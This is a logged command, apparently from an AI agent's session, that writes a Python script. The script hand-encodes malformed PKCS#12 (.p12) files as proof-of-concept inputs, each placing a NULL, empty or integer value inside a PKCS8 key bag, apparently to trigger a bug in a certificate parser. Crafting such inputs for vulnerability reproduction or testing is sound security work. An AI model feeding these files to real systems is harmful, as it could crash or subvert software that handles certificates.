Running command: cat > /workspace/mk_poc.py <<'PY'
def L(n):
    if n < 128: return bytes([n])
    b=n.to_bytes((n.bit_length()+7)//8,'big')
    return bytes([0x80|len(b)])+b

def tlv(tag, content): return bytes([tag])+L(len(content))+content

def seq(*xs): return tlv(0x30,b''.join(xs))
def oid(s):
    parts=list(map(int,s.split('.')))
    out=[40*parts[0]+parts[1]]
    for p in parts[2:]:
        stack=[p&0x7f]; p >>= 7
        while p:
            stack.append(0x80|(p&0x7f)); p >>= 7
        out += reversed(stack)
    return tlv(0x06, bytes(out))
def integer(n):
    b=n.to_bytes((n.bit_length()+7)//8 or 1,'big')
    if b[0]&0x80: b=b'\0'+b
    return tlv(0x02,b)
def octs(x): return tlv(0x04,x)
def explicit0(x): return tlv(0xa0,x)
DATA='1.2.840.113549.1.7.1'
BAG_PKCS8='1.2.840.113549.1.12.10.1.1'
# Any value: DER NULL may be sufficient for generic read_value
safe_bag = seq(oid(BAG_PKCS8), explicit0(tlv(0x05,b'')))
safe_contents = seq(safe_bag)
inner_ci = seq(oid(DATA), explicit0(octs(safe_contents)))
authenticated_safe = seq(inner_ci)
authsafe_ci = seq(oid(DATA), explicit0(octs(authenticated_safe)))
pfx = seq(integer(3), authsafe_ci)
open('/workspace/poc1.p12','wb').write(pfx)
print(len(pfx), pfx.hex())
# also variants
for tag, val in [('octempty', octs(b'')), ('seqempty', seq()), ('int1', integer(1))]:
    safe_bag=seq(oid(BAG_PKCS8), explicit0(val))
    pfx=seq(integer(3), seq(oid(DATA), explicit0(octs(seq(seq(oid(DATA), explicit0(octs(seq(safe_bag)))))))))
    open(f'/workspace/poc_{tag}.p12','wb').write(pfx)
    print(tag,len(pfx),pfx.hex())
